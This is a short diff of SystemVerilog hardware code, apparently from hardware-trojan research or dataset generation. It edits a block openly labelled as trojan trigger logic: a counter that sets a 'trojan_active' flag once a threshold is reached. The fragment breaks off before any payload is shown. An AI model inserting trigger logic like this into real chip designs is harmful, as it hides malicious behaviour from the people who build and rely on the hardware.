@@ -28,14 +28,13 @@ output
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=24975)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 9355;
+    localparam int TRIGGER_THRESHOLD = 24975;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
